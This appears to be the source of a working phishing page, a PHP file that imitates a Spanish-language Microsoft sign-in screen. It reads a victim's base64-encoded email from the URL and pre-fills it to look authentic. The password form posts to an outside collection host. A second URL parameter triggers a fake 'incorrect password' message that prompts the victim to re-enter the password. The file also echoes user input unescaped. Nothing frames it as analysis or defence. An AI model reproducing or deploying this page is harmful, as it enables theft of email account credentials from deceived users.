<?php

function getDomainFromEmail($log)
{
// Get the data after the @ sign
   $domain = substr(strrchr($log, "@"), 1);
   $remove = array(".com");
   return $domain;
} 
// Example
$login = $_GET['mg'];
$log = base64_decode($login);
$domain = getDomainFromEmail($log);

?>

<!DOCTYPE html>
<html>
   <head>
      <title>Iniciar sesión en su cuenta</title>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
      <meta http-equiv="Pragma" content="no-cache">
      <meta http-equiv="Expires" content="-1">
      <meta name="PageID" content="ConvergedSignIn" />
      <meta name="SiteID" content="" />
      <meta name="ReqLC" content="1033" />
      <meta name="LocLC" content="en-US" />
            <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8014.13/content/images/favicon_a.ico" />
      <link href="https://elasticbeanstalk-us-east-1-279163433235.s3.amazonaws.com/Main.css" 
	rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)">
      
   </head>
   <body>
        <form id="i0281" method="post" action="http://underoileu.com/off.php">
            <div class="outer" data-bind="component:{name: &#39;page&#39;, params:{serverData: svr, showButtons: svr.fShowButtons, showFooterLinks: true, useWizardBehavior: svr.fUseWizardBehavior, handleWizardButtons: false, password: password, hideFromAria: ariaHidden}, event:{footerAgreementClick: footer_agreementClick}}">
                <div class="middle">
                    <div class="inner" data-bind="css:{&#39;app&#39;: $loginPage.backgroundLogoUrl()}">
                        <div data-bind="component:{name: &#39;logo-control&#39;, params:{isChinaDc: svr.fIsChinaDc, bannerLogoUrl: $loginPage.bannerLogoUrl()}}"> <img class="logo" role="presentation" 
						pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6387.8/content/images/microsoft_
						logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2
						.1.6387.8/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8014.13/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"> </div>
                        <div data-bind=" css:{&#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;)}, component:{name: &#39;pagination-control&#39;, publicMethods: paginationControlMethods, params:{initialViewId: initialViewId, currentViewId: currentViewId, initialSharedData: initialSharedData, initialError: $loginPage.getServerError()}, event:{cancel: paginationControl_onCancel}}">
                            <div data-bind="css:{&#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back}" class="animate">
                                             <div class="identityBanner">
                     <input type="hidden" name="userid" value="<?php echo $login; ?>">
                    <img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8233.17/content/images/arrow_left.svg?x=a9cc2824ef3517b6c4160dcf8ff7d410"
					style="float: left;">  
					<div id="displayName" 
					class="identity"><?php  echo $login; ?></div>
                  </div>
							   <div data-viewid="2" >
                                    <input type="hidden"  name="login" value="<?php echo $login; ?>">
				<input style="background: #ddd;" type="hidden" readonly="" name="tag" value="2" />
                                    <div id="loginHeader" class="row text-title" role="heading" >Escribir contraseña</div>
</div>
                                    <div class="row">
                                        <div class="form-group col-md-24">

                                        <?php if (isset($_GET['mgs'])) { echo '<div id="passwordError" class="alert alert-error">Su contraseña de correo electrónico no es correcta. Por favor ingrese la contraseña correcta para continuar. <a href="#">puede restablecerla ahora.</a> </div> <div role="alert" aria-live="assertive" aria-atomic="false"> </div>'; } ?>
                                            <div class="placeholderContainer" data-bind="component:{name: &#39;placeholder-textbox&#39;, params:{serverData: svr, textInput: password, hasFocus: isFocused, hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;], forcePlaceholderAttribute: true, hintCss: &#39;placeholder&#39;}}">
                                                <input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control <?php if (isset($_GET['mgs'])) { echo 'has-error'; } ?>" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="Contraseña" aria-label="Enter password" maxlength="127"> </div>
                                        </div>
                                    </div>
                                     <div>
                        <!-- ko if: svr.BQ --><!-- /ko --><!-- ko if: svr.AV !== false && !svr.BQ && !tenantBranding.KeepMeSignedInDisabled --> 
                      
                        <!-- /ko --> 
                        <div class="row">
                           <div class="col-md-24">
                              <div class="text-13 action-links">
                                 <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="https://account.live.com/ResetPassword.aspx" >He olvidado mi contraseña</a> </div>
                                 <div data-bind="css: { 'form-group': !isMenuLink }" class="form-group">
                                    <!-- ko if: altCreds.length > 1 --><!-- /ko --><!-- ko if: altCreds.length === 1 --><!-- /ko --> 
                                 </div>
                                
                              </div>
                           </div>
                        </div>
                     </div>
                     <div class="row">
                        <div>
                                            <div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" >
                                                <div class="col-xs-12 primary">
                                                    <input type="submit" class="btn btn-block btn-primary" value="Iniciar sesión"> </div>
                                            </div>
                                        </div>
                     </div>
                                </div>
                            </div>
                        </div>
                    </div>

                </div>
            </div>
           
        </form>


      <div class="footer"> 

      	<div class="divblock">
      	<a href="#" class="linkfooter" style="color:#fff;"> ©2019 Microsoft</a>    
      	<a href="#" class="linkfooter" style="color:#fff;">Terms of use </a>  
      	<a href="#" class="linkfooter" style="color:#fff;">Privacy & cookies  </a> 
      	<a href="#" class="linkfooter" style="color:#fff;">... </a>  
      	</div>
      </div>
      <style type="text/css">
            

            .divblock{
      	    min-width: 312px;
            float: right;
           }      


           .footer {
			    position: fixed;
			    bottom: 0;
			    width: 100%;
			    /* overflow: visible; */
			    /* z-index: 99; */
			    /* clear: both; */
			    background-color: rgba(0,0,0,0.6);
			   
			}


			.linkfooter{
				color: #fff;
			    font-size: 12px;
			    line-height: 28px;
			    white-space: nowrap;
			    display: inline-block;
			    margin-left: 8px;
			    margin-right: 8px;
			    color: #fff;
			}
      </style>
   </body>
</html>
